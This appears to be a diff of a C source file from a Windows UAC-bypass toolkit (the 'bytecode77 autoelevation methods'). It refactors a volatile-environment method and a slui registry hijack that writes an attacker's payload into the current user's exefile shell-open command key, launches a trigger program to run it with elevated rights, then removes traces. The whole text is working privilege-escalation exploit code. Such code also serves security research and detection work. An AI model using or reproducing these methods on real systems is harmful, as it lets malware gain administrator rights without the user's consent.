@@ -4,9 +4,9 @@
 *
 *  TITLE:       BYTECODE77.C
 *
-*  VERSION:     2.90
+*  VERSION:     3.00
 *
-*  DATE:        10 July 2018
+*  DATE:        25 Aug 2018
 *
 *  bytecode77 autoelevation methods.
 *
@@ -52,8 +52,13 @@ BOOL ucmVolatileEnvMethod(
         //
         // Replace default Fubuki dll entry point with new and remove dll flag.
         //
-        if (!supConvertDllToExeSetNewEP(ProxyDll, ProxyDllSize, FUBUKI_DEFAULT_ENTRYPOINT))
+        if (!supConvertDllToExeSetNewEP(
+            ProxyDll,
+            ProxyDllSize,
+            FUBUKI_DEFAULT_ENTRYPOINT))
+        {
             break;
+        }
 
         //
         // Create %temp%\KureND directory.
@@ -116,7 +121,7 @@ BOOL ucmSluiHijackMethod(
     _In_ LPWSTR lpszPayload
 )
 {
-    BOOL bResult = FALSE, bSymLinkCleanup = FALSE;
+    BOOL bResult = FALSE, bSymLinkCleanup = FALSE, bValueSet = FALSE;
     HKEY hKey = NULL;
     SIZE_T sz = 0;
     LRESULT lResult;
@@ -150,19 +155,31 @@ BOOL ucmSluiHijackMethod(
 
     if (lResult == ERROR_SUCCESS) {
 
+        lResult = ERROR_ACCESS_DENIED;
+
         //
         // Set "Default" value as our payload.
         //
         cbData = (DWORD)((1 + sz) * sizeof(WCHAR));
-        if (g_ctx.MethodExecuteType == ucmExTypeRemediationRequired) {
 
-            if (NT_SUCCESS(wdRegSetValueIndirectHKCU(szBuffer, NULL, lpszPayload, (ULONG)cbData))) {
+        switch (g_ctx.MethodExecuteType) {
+        
+        case ucmExTypeRegSymlink:
+            
+            if (NT_SUCCESS(supRegSetValueIndirectHKCU(
+                szBuffer, 
+                NULL, 
+                lpszPayload, 
+                (ULONG)cbData))) 
+            {
                 bSymLinkCleanup = TRUE;
                 lResult = ERROR_SUCCESS;
             }
 
-        }
-        else {
+            break;
+
+        case ucmExTypeDefault:
+        default:
 
             lResult = RegSetValueEx(
                 hKey,
@@ -170,9 +187,14 @@ BOOL ucmSluiHijackMethod(
                 0, REG_SZ,
                 (BYTE*)lpszPayload,
                 cbData);
+            
+
+            break;
         }
 
-        if (lResult == ERROR_SUCCESS) {
+        bValueSet = (lResult == ERROR_SUCCESS);
+
+        if (bValueSet) {
 
             //
             // Run trigger application.
@@ -197,18 +219,29 @@ BOOL ucmSluiHijackMethod(
     }
 
     //
-    // Remove symlink.
+    // Remove symlink if set.
     //
-    if (g_ctx.MethodExecuteType == ucmExTypeRemediationRequired) {
-        if (bSymLinkCleanup)
-            wdRemoveRegLinkHKCU();
-    }
+    if (bSymLinkCleanup)
+        supRemoveRegLinkHKCU();
 
     //
     // Remove key with all subkeys.
     //
-    if (dwKeyDisposition == REG_CREATED_NEW_KEY)
-        supDeleteKeyRecursive(HKEY_CURRENT_USER, T_EXEFILE_SHELL);
+    if (dwKeyDisposition == REG_CREATED_NEW_KEY) {
+        supRegDeleteKeyRecursive(
+            HKEY_CURRENT_USER, 
+            T_EXEFILE_SHELL);
+    }
+    else {
+        if (bValueSet) {
+            _strcpy(szBuffer, T_EXEFILE_SHELL);
+            _strcat(szBuffer, T_SHELL_OPEN_COMMAND);
+            supDeleteKeyValueAndFlushKey(
+                HKEY_CURRENT_USER,
+                szBuffer,
+                TEXT(""));
+        }
+    }
 
 #ifndef _WIN64
     if (g_ctx.IsWow64) {
